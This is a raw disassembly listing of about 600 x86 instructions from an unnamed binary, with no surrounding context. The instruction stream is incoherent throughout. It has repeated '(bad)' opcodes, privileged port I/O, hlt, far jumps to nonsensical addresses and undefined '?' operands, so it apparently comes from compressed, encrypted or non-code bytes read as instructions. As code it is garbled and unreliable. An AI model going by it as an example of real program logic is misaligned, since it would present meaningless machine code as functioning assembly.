  405b0b:	scas   al,BYTE PTR es:[edi]
  405b0c:	inc    ebx
  405b0d:	add    eax,0xe2997fab
  405b12:	adc    eax,0x8d7a3189
  405b17:	cdq    
  405b18:	adc    eax,0x6540068a
  405b1d:	inc    edi
  405b1e:	or     ebx,eax
  405b20:	fsub   st(6),st
  405b22:	adc    al,0x83
  405b24:	sbb    eax,edi
  405b26:	mov    bl,0x9d
  405b28:	adc    al,0x3c
  405b2a:	jbe    0x405b36
  405b2c:	xchg   esp,eax
  405b2d:	and    DWORD PTR [eax],ebx
  405b2f:	(bad)  
  405b30:	les    esi,FWORD PTR ds:0x7085177d
  405b36:	adc    BYTE PTR [bx+si+0x6],ch
  405b3a:	pusha  
  405b3b:	push   ecx
  405b3c:	mov    BYTE PTR [ecx],ch
  405b3e:	jne    0x405b3a
  405b40:	fsubr  QWORD PTR [ebx+0x28]
  405b43:	lods   al,BYTE PTR ds:[esi]
  405b44:	add    eax,0xff15abf7
  405b49:	test   al,0x7d
  405b4b:	ret    0x8418
  405b4e:	sub    ch,BYTE PTR [ebp+0x1ec02dca]
  405b54:	aas    
  405b55:	xor    ebx,DWORD PTR [esi+0xebc89b0]
  405b5b:	xlat   BYTE PTR ds:[ebx]
  405b5c:	xor    ch,BYTE PTR [esi-0x4b6b4907]
  405b62:	lahf   
  405b63:	cmc    
  405b64:	sub    bh,BYTE PTR [esi+0x1]
  405b67:	add    cl,BYTE PTR [edi-0x60]
  405b6a:	gs sbb eax,0x5722698d
  405b70:	mov    eax,ds:0x25518d67
  405b75:	push   0x74
  405b77:	cmp    ebx,0xffffffcc
  405b7a:	fisttp QWORD PTR [ebp+0x7d]
  405b7d:	and    BYTE PTR [ebx-0x36987aa3],ch
  405b83:	in     eax,0x40
  405b85:	shl    BYTE PTR [esi+eax*1+0x3ace236d],1
  405b8c:	cmp    eax,0xabdc831b
  405b91:	(bad)  
  405b92:	mov    eax,ds:0x2273a7e2
  405b97:	push   es
  405b98:	out    dx,al
  405b99:	fs (bad) 
  405b9b:	adc    eax,0xf1fcaf9a
  405ba0:	(bad)  
  405ba2:	shl    DWORD PTR [esi-0x58c3bf59],cl
  405ba8:	xchg   ebx,eax
  405ba9:	sub    eax,0x7eb590af
  405bae:	clc    
  405baf:	retf   
  405bb0:	mov    ebp,0xb0565b9a
  405bb5:	lds    eax,FWORD PTR [ebp+0x3f]
  405bb8:	lahf   
  405bb9:	test   DWORD PTR [edi+0x30c53d42],0x277b564
  405bc3:	stos   DWORD PTR es:[edi],eax
  405bc4:	cmp    eax,0x7eaa9989
  405bc9:	enter  0xdb6e,0x64
  405bcd:	sti    
  405bce:	adc    BYTE PTR [edi],ch
  405bd0:	cmp    edi,DWORD PTR [ebp+0x5324cba3]
  405bd6:	xchg   ecx,eax
  405bd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bd8:	cdq    
  405bd9:	ret    
  405bda:	jg     0x405bce
  405bdc:	mov    ?,esp
  405bde:	push   ebx
  405bdf:	mov    eax,ds:0x1e6dec42
  405be4:	lods   al,BYTE PTR ds:[esi]
  405be5:	out    0x28,al
  405be7:	outs   dx,BYTE PTR ds:[esi]
  405be8:	xchg   ebp,eax
  405be9:	hlt    
  405bea:	arpl   cx,bx
  405bec:	cli    
  405bed:	xchg   ebp,eax
  405bee:	cmp    eax,0xa8ec2b1
  405bf3:	jns    0x405c1c
  405bf5:	in     eax,dx
  405bf6:	mov    ebp,0x8e69dfb6
  405bfb:	adc    BYTE PTR [eax+0x1d],bh
  405bfe:	cdq    
  405bff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c00:	scas   eax,DWORD PTR es:[edi]
  405c01:	jge    0x405c70
  405c03:	or     cl,BYTE PTR ss:[ebx-0x7b]
  405c07:	iret   
  405c08:	lods   al,BYTE PTR ds:[esi]
  405c09:	test   eax,0x4b09e289
  405c0e:	xchg   ebp,eax
  405c0f:	xchg   ebx,eax
  405c10:	sar    DWORD PTR [ebx],cl
  405c12:	lds    edx,FWORD PTR [ebp+0x66147b6c]
  405c18:	mov    ds:0xb20876f,al
  405c1d:	xlat   BYTE PTR ds:[ebx]
  405c1e:	outs   dx,DWORD PTR ds:[esi]
  405c1f:	in     al,dx
  405c20:	test   al,0x74
  405c22:	mov    al,fs:0xa29eabf8
  405c28:	mov    ch,0x2b
  405c2a:	dec    ebp
  405c2b:	daa    
  405c2c:	xchg   ch,bl
  405c2e:	cmp    DWORD PTR [ebp-0x3fa2c3da],eax
  405c34:	lock push 0xffffffac
  405c37:	sbb    bl,bl
  405c39:	jbe    0x405c93
  405c3b:	scas   al,BYTE PTR es:[edi]
  405c3c:	es nop
  405c3e:	icebp  
  405c3f:	popf   
  405c40:	or     eax,0x534025bc
  405c45:	mul    BYTE PTR [ebx-0x7a00bf17]
  405c4b:	push   edx
  405c4c:	lods   al,BYTE PTR ds:[esi]
  405c4d:	lods   al,BYTE PTR ds:[esi]
  405c4e:	sub    BYTE PTR [edi-0x76],dh
  405c51:	ror    dl,1
  405c53:	rol    bl,cl
  405c55:	mov    bh,0xc2
  405c57:	cs stos DWORD PTR es:[edi],eax
  405c59:	or     eax,0x8d350741
  405c5e:	pop    ebp
  405c5f:	sub    dl,BYTE PTR ds:0x7e2f7276
  405c65:	xor    BYTE PTR [eax-0x2977f9c2],0x26
  405c6c:	stc    
  405c6d:	xor    BYTE PTR [ecx+eiz*4],cl
  405c70:	(bad)  
  405c71:	ins    DWORD PTR es:[edi],dx
  405c72:	sar    BYTE PTR [ecx+0x2b],cl
  405c75:	xchg   edx,eax
  405c76:	repnz sub esp,DWORD PTR [edx+0x21675809]
  405c7d:	in     al,0xe2
  405c7f:	mov    ah,0xe4
  405c81:	cmc    
  405c82:	mov    ebp,0xb31e6a68
  405c87:	ds loopne 0x405cb2
  405c8a:	sub    DWORD PTR [edx+0x1c324848],edx
  405c90:	sar    cl,0x3d
  405c93:	int3   
  405c94:	jb     0x405cd3
  405c96:	mov    cl,0xbb
  405c98:	cdq    
  405c99:	cld    
  405c9a:	jnp    0x405c8f
  405c9c:	jae    0x405c9a
  405c9e:	jl     0x405cf7
  405ca0:	retf   
  405ca1:	adc    al,0x62
  405ca3:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  405ca5:	pop    ebx
  405ca6:	gs push cs
  405ca8:	jle    0x405c36
  405caa:	ja     0x405cd6
  405cac:	mov    al,ds:0xc78406c2
  405cb1:	cmp    eax,0x9fc97403
  405cb6:	fwait
  405cb7:	xchg   DWORD PTR [edx],edi
  405cb9:	and    eax,esi
  405cbb:	pop    es
  405cbc:	fnstsw WORD PTR [ecx-0x49]
  405cbf:	fbstp  TBYTE PTR [esi-0x2aa9bb78]
  405cc5:	neg    bh
  405cc7:	shr    dl,0x3f
  405cca:	int    0x84
  405ccc:	sbb    esi,DWORD PTR [ecx+ebp*4-0x242da52c]
  405cd3:	dec    esp
  405cd4:	loop   0x405d37
  405cd6:	push   es
  405cd7:	add    al,0x97
  405cd9:	lahf   
  405cda:	sub    edi,esi
  405cdc:	hlt    
  405cdd:	(bad)  
  405cde:	pop    ss
  405cdf:	adc    edx,0x638f6493
  405ce5:	push   ebx
  405ce6:	jmp    DWORD PTR [ecx+eiz*4]
  405ce9:	aas    
  405cea:	mov    ah,0x65
  405cec:	gs jo  0xca6a244a
  405cf3:	mov    cs,WORD PTR [esi]
  405cf5:	and    dl,BYTE PTR [eax-0x6669c07e]
  405cfb:	cmp    al,0x14
  405cfd:	add    al,0x91
  405cff:	stc    
  405d00:	outs   dx,DWORD PTR ds:[esi]
  405d01:	dec    esp
  405d02:	popf   
  405d03:	lds    edi,FWORD PTR [edx+0x17]
  405d06:	arpl   WORD PTR [ecx+0x2c],dx
  405d09:	outs   dx,BYTE PTR ds:[esi]
  405d0a:	mov    cl,0xda
  405d0c:	jmp    0x5afdeb63
  405d11:	lods   eax,DWORD PTR ds:[esi]
  405d12:	nop
  405d13:	xchg   DWORD PTR [ebx-0x8],edi
  405d16:	mov    esi,0x3abfc82f
  405d1b:	inc    edx
  405d1c:	pop    es
  405d1d:	mov    ebx,0x1152d9cf
  405d22:	pop    ecx
  405d23:	mov    esi,DWORD PTR [edi+0x22]
  405d26:	sub    DWORD PTR [edi-0x5],edx
  405d29:	test   al,0xe5
  405d2b:	ins    BYTE PTR es:[edi],dx
  405d2c:	leave  
  405d2d:	outs   dx,DWORD PTR ds:[esi]
  405d2e:	sar    DWORD PTR [edi-0x6],cl
  405d31:	mov    edx,0x41aa9e3d
  405d36:	or     dl,0xfd
  405d39:	jl     0x405d71
  405d3b:	in     eax,0x48
  405d3d:	je     0x405db6
  405d3f:	inc    ebp
  405d40:	adc    DWORD PTR [eax-0x49],0xffffff98
  405d44:	ja     0x405dbf
  405d46:	pop    eax
  405d47:	aad    0x3a
  405d49:	push   edi
  405d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d4b:	ret    
  405d4c:	inc    edx
  405d4d:	jne    0x405dcd
  405d4f:	cmp    bh,ah
  405d51:	lods   al,BYTE PTR ds:[esi]
  405d52:	loopne 0x405cd7
  405d54:	popf   
  405d55:	loop   0x405d58
  405d57:	mov    ah,0x9e
  405d59:	sbb    eax,0x7022bf98
  405d5e:	mov    esp,0x53ff3188
  405d63:	outs   dx,DWORD PTR ds:[esi]
  405d64:	cmp    ecx,DWORD PTR [ebp+0x16]
  405d67:	push   edi
  405d68:	imul   esp,DWORD PTR [eax],0x2443f854
  405d6e:	out    dx,eax
  405d6f:	(bad)  
  405d70:	mov    bh,0x9e
  405d72:	jns    0xcb14a6f2
  405d78:	mov    eax,0xba0e7bf
  405d7d:	push   ss
  405d7e:	inc    esi
  405d7f:	xor    BYTE PTR [edx-0x4855c71a],dh
  405d85:	add    DWORD PTR [edi],eax
  405d87:	mov    esi,DWORD PTR [edi-0x40623796]
  405d8d:	mov    BYTE PTR [edx+0x463d67a9],dl
  405d93:	jo     0x405d4f
  405d95:	arpl   dx,si
  405d97:	add    BYTE PTR [esi+esi*2+0x4b655e],cl
  405d9e:	mov    ebx,ebp
  405da0:	jle    0x405d73
  405da2:	and    al,0x40
  405da4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405da5:	mov    dl,0xd8
  405da7:	shr    DWORD PTR [ecx+0x45b4a866],0x5a
  405dae:	sbb    DWORD PTR [esp+eax*1],ebx
  405db1:	cdq    
  405db2:	pop    ecx
  405db3:	cmp    al,dh
  405db5:	jge    0x405dea
  405db7:	push   ebp
  405db8:	and    edi,ebx
  405dba:	iret   
  405dbb:	xchg   esi,eax
  405dbc:	adc    al,0xb3
  405dbe:	mov    ebx,0xcc3aba88
  405dc3:	jecxz  0x405d78
  405dc5:	lods   eax,DWORD PTR ds:[esi]
  405dc6:	inc    eax
  405dc7:	dec    ebx
  405dc8:	jb     0x405d54
  405dca:	jecxz  0x405dff
  405dcc:	jne    0x405e46
  405dce:	rcl    bh,cl
  405dd0:	push   0xfffffffc
  405dd2:	or     ah,al
  405dd4:	dec    edx
  405dd5:	mov    ch,dh
  405dd7:	test   bh,0xff
  405dda:	aam    0x7
  405ddc:	loope  0x405d62
  405dde:	inc    ebx
  405ddf:	mov    cl,0x32
  405de1:	cmp    al,0x79
  405de3:	mov    ds:0xeca96a0e,eax
  405de8:	retf   0xd10b
  405deb:	test   al,0x2e
  405ded:	pop    ebx
  405dee:	addr16 sbb al,0xf5
  405df1:	arpl   WORD PTR [edi+0x1d],di
  405df4:	pushf  
  405df5:	dec    ecx
  405df6:	sbb    al,0xda
  405df8:	cwde   
  405df9:	aaa    
  405dfa:	lods   al,BYTE PTR ds:[esi]
  405dfb:	mov    edx,0xe5c0a253
  405e00:	stc    
  405e01:	mov    ch,0xa8
  405e03:	jmp    0x405e82
  405e05:	inc    eax
  405e06:	out    dx,eax
  405e07:	pop    ebx
  405e08:	mov    eax,0x12f54069
  405e0d:	retf   
  405e0e:	jecxz  0x405dd2
  405e10:	xor    ecx,DWORD PTR [eax-0x44]
  405e13:	lods   eax,DWORD PTR ds:[esi]
  405e14:	push   0xffffffd8
  405e16:	mov    edx,0xe58056c9
  405e1b:	pushf  
  405e1c:	into   
  405e1d:	aam    0x58
  405e1f:	sbb    esp,edx
  405e21:	adc    bl,BYTE PTR [ebx+0x5c5cb106]
  405e27:	or     al,0x6c
  405e29:	and    esp,DWORD PTR [ebx+0x42945542]
  405e2f:	cmc    
  405e30:	xchg   ecx,eax
  405e31:	and    al,0xbd
  405e33:	rcl    BYTE PTR ds:0xba4ec16e,1
  405e39:	jmp    0x45e443f2
  405e3e:	and    bh,BYTE PTR [eax-0x115b5aed]
  405e44:	xchg   esi,eax
  405e45:	mov    ch,0x2
  405e47:	add    dl,BYTE PTR [ecx-0x6b]
  405e4a:	jb     0x405df3
  405e4c:	cmp    al,0x6a
  405e4e:	aas    
  405e4f:	out    0xcd,al
  405e51:	pusha  
  405e52:	inc    eax
  405e53:	inc    eax
  405e54:	mov    cl,0x9a
  405e56:	fstp   TBYTE PTR [esi-0x3b]
  405e59:	mov    ebp,0x85c76d37
  405e5e:	add    cl,dh
  405e60:	mov    ch,0x76
  405e62:	loope  0x405ed8
  405e64:	sti    
  405e65:	xor    BYTE PTR ds:0x4300045b,al
  405e6b:	sbb    eax,0x82c88c75
  405e70:	scas   eax,DWORD PTR es:[edi]
  405e71:	pop    ecx
  405e72:	pop    ss
  405e73:	test   DWORD PTR [edx],esp
  405e75:	out    dx,al
  405e76:	into   
  405e77:	jecxz  0x405ea0
  405e79:	and    bh,al
  405e7b:	ror    BYTE PTR [esi-0x65],1
  405e7e:	loope  0x405ec2
  405e80:	in     al,dx
  405e81:	hlt    
  405e82:	dec    edx
  405e83:	inc    esp
  405e84:	pop    ecx
  405e85:	and    DWORD PTR [esi],0x16
  405e88:	push   0xde8cb72a
  405e8d:	and    eax,0xea7a7786
  405e92:	outs   dx,DWORD PTR ds:[esi]
  405e93:	lock call 0xb735:0x6d265837
  405e9b:	jo     0x405ee5
  405e9d:	or     eax,0x5c3d762a
  405ea2:	sar    DWORD PTR [ecx+edi*2],cl
  405ea5:	shr    DWORD PTR [esi+0x2f],1
  405ea8:	mov    WORD PTR [edx-0x308275f3],ss
  405eae:	gs inc edx
  405eb0:	or     DWORD PTR [eax+0x1de2658],0x68
  405eb7:	bound  edx,QWORD PTR [edx+0x4a1c61b2]
  405ebd:	leave  
  405ebe:	adc    DWORD PTR [eax],ebx
  405ec0:	mov    al,ds:0x6ad215e2
  405ec5:	inc    ebx
  405ec6:	dec    ebx
  405ec7:	sbb    DWORD PTR [edi],esi
  405ec9:	inc    edx
  405eca:	ins    BYTE PTR es:[edi],dx
  405ecb:	outs   dx,BYTE PTR ds:[esi]
  405ecc:	xor    bh,bl
  405ece:	in     eax,0xcd
  405ed0:	sbb    DWORD PTR [ebp-0x7e18633c],ebx
  405ed6:	mov    cl,0x3b
  405ed8:	fist   WORD PTR [eax-0x78827227]
  405ede:	mov    ecx,0x4cee765a
  405ee3:	in     al,dx
  405ee4:	outs   dx,DWORD PTR ds:[esi]
  405ee5:	fistp  WORD PTR [edx-0x6edaaca3]
  405eeb:	mov    al,ds:0xbafd7261
  405ef0:	sbb    dl,BYTE PTR ds:0x78d88305
  405ef6:	(bad)  
  405ef7:	stc    
  405ef8:	sbb    ecx,edx
  405efa:	add    al,ah
  405efc:	jge    0x405ec6
  405efe:	in     eax,0xe3
  405f00:	fisttp DWORD PTR [ebx+0x69769732]
  405f06:	mov    WORD PTR [edx-0x71],?
  405f09:	std    
  405f0a:	mov    cl,0x6d
  405f0c:	pushf  
  405f0d:	jmp    0x3e46:0xdb615fa3
  405f14:	xchg   ebx,eax
  405f15:	jb     0x405ed7
  405f17:	sahf   
  405f18:	je     0x405ebf
  405f1a:	nop
  405f1b:	dec    esi
  405f1c:	adc    esp,DWORD PTR [edx+0x26]
  405f1f:	jl     0x405f2b
  405f21:	cld    
  405f22:	push   ds
  405f23:	iret   
  405f24:	cdq    
  405f25:	push   edi
  405f26:	in     eax,0x84
  405f28:	retf   0x1b3c
  405f2b:	(bad)  
  405f2c:	mov    edx,0x121c1480
  405f31:	xchg   BYTE PTR [edi-0x63349bb9],cl
  405f37:	mov    ds:0x1c309b00,eax
  405f3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f3d:	test   DWORD PTR [esi],ebx
  405f3f:	mov    ch,0xd8
  405f41:	fwait
  405f42:	mov    edi,0x15dd9e32
  405f47:	jnp    0x405ef8
  405f49:	pop    ss
  405f4a:	jmp    0x5b4b:0xda8f04e6
  405f51:	cmp    cl,BYTE PTR [ecx+0x74]
  405f54:	gs mov cl,0xbb
  405f57:	mov    dh,0xd7
  405f59:	test   al,0xbf
  405f5b:	nop
  405f5c:	dec    ebp
  405f5d:	outs   dx,BYTE PTR ds:[esi]
  405f5e:	add    eax,edi
  405f60:	pop    ebp
  405f61:	mov    edi,0xe589714c
  405f66:	sbb    ebp,DWORD PTR [edi]
  405f68:	sbb    eax,0xb5e3328d
  405f6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f6e:	int    0xf3
  405f70:	scas   al,BYTE PTR es:[edi]
  405f71:	dec    bx
  405f73:	(bad)  
  405f74:	sti    
  405f75:	test   eax,0x53091c7c
  405f7a:	xchg   esi,eax
  405f7b:	call   0x928f3393
  405f80:	dec    eax
  405f81:	cmc    
  405f82:	cmp    ah,bh
  405f84:	cmp    eax,0xff86e31
  405f89:	mov    al,ds:0x9926a954
  405f8e:	imul   ebx,edi,0xffffffa0
  405f91:	outs   dx,DWORD PTR ds:[esi]
  405f92:	call   0x1bb:0x81abafd9
  405f99:	adc    BYTE PTR [edx-0x77cf6335],bl
  405f9f:	xor    eax,0x6b0b8f88
  405fa4:	adc    DWORD PTR [ebx-0x3b31ec2d],0xf1da45c4
  405fae:	pop    es
  405faf:	cmp    BYTE PTR es:[ebx+0x40],dl
  405fb3:	mov    DWORD PTR [esi],eax
  405fb5:	fcmovnb st,st(3)
  405fb7:	ins    BYTE PTR es:[edi],dx
  405fb8:	fs aad 0x53
  405fbb:	push   DWORD PTR [ebp-0x4c56697f]
  405fc1:	jmp    0xda66c1ba
  405fc6:	fst    DWORD PTR [ecx+edx*8]
  405fc9:	test   eax,0x6d4adfb0
  405fce:	sbb    dl,BYTE PTR [ecx-0x54e86612]
  405fd4:	cs popf 
  405fd6:	in     eax,0x2b
  405fd8:	test   edx,ecx
  405fda:	pushf  
  405fdb:	sbb    bl,BYTE PTR [edi]
  405fdd:	call   0xd774:0x6d3e4bf6
  405fe4:	xchg   ecx,eax
  405fe5:	add    al,0xd
  405fe7:	popa   
  405fe8:	loopne 0x405fad
  405fea:	lea    ecx,[ebx+ecx*8-0x20]
  405fee:	xchg   esi,eax
  405fef:	push   esp
  405ff0:	add    ch,BYTE PTR [edi+edi*1-0x60]
  405ff4:	test   DWORD PTR [ecx+0x28],esp
  405ff7:	sbb    eax,0xe2d7a962
  405ffc:	add    DWORD PTR [ebp+0xf],esi
  405fff:	(bad)  
  406000:	mov    ch,0x5a
  406002:	mov    es,WORD PTR [edi]
  406004:	retf   0x2f5a
  406007:	sbb    eax,0xcd8beebf
  40600c:	(bad)
  406010:	pop    edi
  406011:	or     DWORD PTR [edx],0xab1a8f6
  406017:	mov    BYTE PTR [ecx+ebx*2],ch
  40601a:	ret    
  40601b:	cs dec esi
  40601d:	hlt    
  40601e:	call   0x5da62f86
  406023:	pop    ds
  406024:	xchg   DWORD PTR [ebx-0x3c],eax
  406027:	xor    eax,0x57a7f241
  40602c:	pop    esp
  40602d:	jno    0x406074
  40602f:	imul   BYTE PTR [edi+eax*8+0x2e7f5dc9]
  406036:	es push edi
  406038:	inc    edx
  406039:	data16 adc BYTE PTR [edi],ah
  40603c:	daa    
  40603d:	cmp    DWORD PTR [ebp-0x18],esi
  406040:	test   DWORD PTR [ecx-0x350f206],esp
  406046:	inc    esp
  406047:	lock in al,dx
  406049:	nop
  40604a:	call   0xcba6:0x629cd69c
  406051:	jmp    0x4ee2:0x67c64c00
  406058:	inc    ebp
  406059:	call   0x2f47284f
  40605e:	add    al,0x16
  406060:	pop    esi
  406061:	pop    eax
  406062:	iret   
  406063:	xchg   ecx,eax
  406064:	xor    DWORD PTR [eax],esp
  406066:	push   edx
  406067:	mov    ecx,0x7cc41d7b
  40606c:	lods   al,BYTE PTR ds:[esi]
  40606e:	push   esp
  40606f:	gs inc edi
  406071:	fcom   DWORD PTR [esi]
  406073:	fdivr  QWORD PTR [edi-0x2603d993]
  406079:	jmp    0x406059
  40607b:	scas   al,BYTE PTR es:[edi]
  40607c:	xchg   esi,eax
  40607d:	mov    ah,BYTE PTR [esi-0x3a5e211d]
  406083:	inc    esp
  406084:	es xchg esi,eax
  406086:	fistp  WORD PTR [ebx]
  406088:	cmp    ebx,DWORD PTR [ebx]
  40608a:	sbb    ebx,DWORD PTR [ebx-0x56]
  40608d:	jb     0x406060
  40608f:	mov    al,ds:0x7c1bf8c1
  406094:	addr16 mov al,0x7b
  406097:	scas   al,BYTE PTR es:[edi]
  406098:	outs   dx,DWORD PTR ds:[esi]
  406099:	dec    ebx
  40609a:	pop    ebx
  40609b:	leave  
  40609c:	jmp    0xa18e:0x428e4f8
  4060a3:	dec    ecx
  4060a4:	pop    ebx
  4060a5:	fst    QWORD PTR [eax-0x3521f590]
  4060ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060ac:	call   0x59f82d10
  4060b1:	addr16 xchg ebx,eax
  4060b3:	ror    BYTE PTR [ebx+0x6c],0xd1
  4060b7:	sar    BYTE PTR [edx+0x6b],0x2
  4060bb:	neg    BYTE PTR [edx+0x60]
  4060be:	pop    ebx
  4060bf:	repnz pop edx
  4060c1:	in     eax,0xff
  4060c3:	add    DWORD PTR [eax-0x7ea409cd],ebx
  4060c9:	xor    eax,DWORD PTR [ecx-0x1ed2ff0d]
  4060cf:	sub    DWORD PTR [eax+0x51aa3a3d],ecx
  4060d5:	call   0xc435:0x1bab090a
  4060dc:	test   DWORD PTR [esi],edx
  4060de:	or     al,0x7e
  4060e0:	xor    al,0x74
  4060e2:	fwait
  4060e3:	dec    esp
  4060e4:	adc    ah,BYTE PTR [ebx+edx*1]
  4060e7:	shl    BYTE PTR [ebp+0x4f],1
  4060ea:	jecxz  0x406145
  4060ec:	aas    
  4060ed:	cmova  edx,DWORD PTR [esi+0x57]
  4060f1:	into   
  4060f2:	out    0x3,eax
  4060f4:	sar    bl,0xf9
  4060f7:	(bad)  
  4060f8:	xor    cl,dh
  4060fa:	pop    edi
  4060fb:	retf   0xea70
  4060fe:	loopne 0x406121
  406100:	push   ds
  406101:	or     al,0x81
  406103:	push   ebp
  406104:	test   al,0xf3
  406106:	fistp  QWORD PTR [ecx+0x53064b40]
  40610c:	push   es
  40610d:	jle    0x406152
  40610f:	xor    DWORD PTR [esi+0x37],ecx
  406112:	shl    bl,1
  406114:	inc    ebx
  406115:	out    0x1d,eax
  406117:	mov    ds,WORD PTR ds:0xe67a9ed9
  40611d:	into   
  40611e:	adc    al,0x5d
  406120:	sub    BYTE PTR [ecx+0x1a],bh
  406123:	or     ebx,0x21e6b6a6
  406129:	add    al,0xb2
  40612b:	inc    ebp
  40612c:	sbb    edi,esp
  40612e:	jnp    0x4060e3
  406130:	pop    esi
  406131:	mov    edi,ebp
  406133:	mov    ecx,0x7e457cbf
  406138:	pop    ebp
  406139:	jbe    0x4060d5
  40613b:	sbb    al,0x55
  40613d:	call   0xc82b9300
  406142:	mov    ah,0xfe
  406144:	dec    edx
  406145:	and    BYTE PTR [ebx],dl
  406147:	cmp    BYTE PTR [edi],bl
  406149:	aas    
  40614a:	sub    DWORD PTR [ebp-0x53],0x37
  40614e:	push   ds
  40614f:	(bad)  
  406150:	fst    DWORD PTR [eax]
  406152:	cli    
  406153:	(bad)  
  406154:	push   ds
  406155:	xchg   edx,eax
  406156:	add    eax,0xfbadd785
  40615b:	scas   al,BYTE PTR es:[edi]
  40615c:	jns    0x406179
  40615e:	hlt    
  40615f:	arpl   WORD PTR [ebx-0x2b3ed5b2],bp
  406165:	inc    ebp
  406166:	in     eax,0x8d
  406168:	xchg   DWORD PTR [esi+0x12],ebp
  40616b:	das    
  40616c:	pop    esi
  40616d:	mov    dh,0x1c
  40616f:	adc    eax,0xb8a8c44c
  406174:	sub    bl,ch
  406176:	pusha  
  406177:	dec    edx
  406178:	nop
  406179:	xor    dh,BYTE PTR [edx+0x5acb103a]
  40617f:	pop    ss
  406180:	into   
  406181:	or     al,0xd2
  406183:	add    BYTE PTR [eax-0x26],ah
  406186:	lods   eax,DWORD PTR ds:[esi]
  406187:	push   cs
  406188:	xchg   edi,eax
  406189:	adc    eax,0x5f7d6ae
  40618e:	adc    BYTE PTR [ebx],al
  406190:	mov    ebp,0x7bc9909e
  406195:	add    al,0x44
  406197:	(bad)  
  406198:	sahf   
  406199:	shr    DWORD PTR [ecx+eiz*1+0x47],1
  40619d:	jmp    0x94266a3e
  4061a2:	xor    ebx,edx
  4061a4:	into   
  4061a5:	ja     0x40618f
  4061a7:	out    dx,al
  4061a8:	xchg   ebp,eax
  4061a9:	dec    ecx
  4061aa:	jmp    0x406132
  4061ac:	dec    esi
  4061ad:	mov    al,0x7a
  4061af:	push   edx
  4061b0:	inc    edx
  4061b1:	and    BYTE PTR [ecx+0x64],ch
  4061b4:	lods   eax,DWORD PTR ds:[esi]
  4061b5:	cld    
  4061b6:	mov    BYTE PTR [edx+0x6273e86c],dh
  4061bc:	iret   
  4061bd:	pop    es
  4061be:	(bad)  
  4061bf:	repz pop ds
  4061c1:	pop    ebp
  4061c2:	inc    esp
  4061c3:	loopne 0x406161
  4061c5:	push   di
  4061c7:	inc    ebp
  4061c8:	jecxz  0x406216
  4061ca:	lods   al,BYTE PTR ds:[esi]
  4061cb:	jbe    0x4061dd
  4061cd:	xchg   esp,eax
  4061ce:	fwait
  4061cf:	mov    dh,0xa3
  4061d1:	ins    DWORD PTR es:[edi],dx
  4061d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061d3:	ret    
  4061d4:	sub    eax,0xedf41d33
  4061d9:	push   0x10
  4061db:	or     eax,0x26b37250
  4061e0:	dec    esp
  4061e1:	idiv   BYTE PTR [ebx]
  4061e3:	cmp    DWORD PTR [edi],edi
  4061e5:	add    ch,ah
  4061e7:	or     BYTE PTR [esi],bh
  4061e9:	and    edi,ecx
  4061eb:	and    ecx,DWORD PTR [esi]
  4061ed:	leave  
  4061ee:	sbb    eax,0xc147a319
  4061f3:	int    0xd9
  4061f5:	lods   eax,DWORD PTR ds:[esi]
  4061f6:	lock mov edi,0x67cc7d6a
  4061fc:	xor    dh,BYTE PTR [esi]
  4061fe:	lds    edx,FWORD PTR [esi-0x3b]
  406201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406203:	mov    edi,0x95498e44
  406208:	fs ret 0x4a40
  40620c:	lds    ebx,FWORD PTR [esi-0x77]
  40620f:	jns    0x406191
  406211:	shl    dl,0x63
  406214:	shr    BYTE PTR [esi+0x5d15d9e0],0x87
  40621b:	test   DWORD PTR ds:[ebp+esi*2+0x2c],ecx
  406220:	dec    esi
  406221:	into   
  406222:	lods   eax,DWORD PTR ds:[esi]
  406223:	sbb    DWORD PTR [ebx],0x6cd81167
  406229:	imul   eax,DWORD PTR [edi],0x52
  40622c:	scas   al,BYTE PTR es:[edi]
  40622d:	and    eax,0xf1d03fc7
  406232:	rcl    DWORD PTR [ecx],0x1c
  406235:	jmp    0x271717a
  40623a:	xchg   edx,eax
  40623b:	jns    0x4061ca
  40623d:	iret   
  40623e:	popf   
  40623f:	mov    ebp,0xfee2dc16
  406244:	stc    
  406245:	shl    DWORD PTR [esi],0xff
  406248:	aas    
  406249:	cmc    
  40624a:	pop    es
  40624b:	(bad)  
  40624c:	jle    0x4062a3
  40624e:	cmp    eax,0xf55ab618
  406253:	mov    al,0x2a
  406255:	fstp   st(2)
  406257:	cmp    al,0x2
  406259:	repnz push edi
  40625b:	inc    edi
  40625c:	add    BYTE PTR [ecx+0x4e6fc1f7],bl
  406262:	mov    edx,0x80085b0a
  406267:	les    ebp,FWORD PTR [eax]
  406269:	rcl    BYTE PTR [eax+0x66],1
  40626c:	sbb    al,BYTE PTR [esi-0x28]
  40626f:	out    0x85,al
  406271:	dec    edi
  406272:	std    
  406273:	shl    al,0x1c
  406276:	aad    0x34
  406278:	hlt    
  406279:	(bad)  
  40627a:	inc    DWORD PTR [edx+0xa]
  40627d:	call   0x96873db1
  406282:	int3   
  406283:	cli    
  406284:	mov    WORD PTR [edi-0xa672c2d],fs
  40628a:	sub    al,0xcd
  40628c:	in     eax,0x88
  40628e:	or     edx,DWORD PTR ds:0x445f8fe0
  406294:	push   ecx
  406295:	xchg   ebp,eax
  406296:	mov    al,0x83
  406298:	(bad)  
  406299:	jb     0x406233
  40629b:	loop   0x406281
  40629d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40629e:	imul   ebx,DWORD PTR [edx+ecx*1+0x700f7a7f],0x71cbb5c4
  4062a9:	lock scas al,BYTE PTR es:[edi]
  4062ab:	jmp    0x406296
  4062ad:	fld    st(7)
  4062af:	adc    eax,DWORD PTR [eax]
  4062b1:	jno    0x40627b
  4062b3:	(bad)  
  4062b4:	fist   WORD PTR [ecx-0x40]
  4062b7:	or     DWORD PTR [eax+0x59],esp
  4062ba:	dec    esp
  4062bb:	xchg   edi,eax
  4062bc:	jmp    0x1a3d7d83
  4062c1:	inc    eax
  4062c2:	mov    ebx,0x53f0856c
  4062c7:	dec    ecx
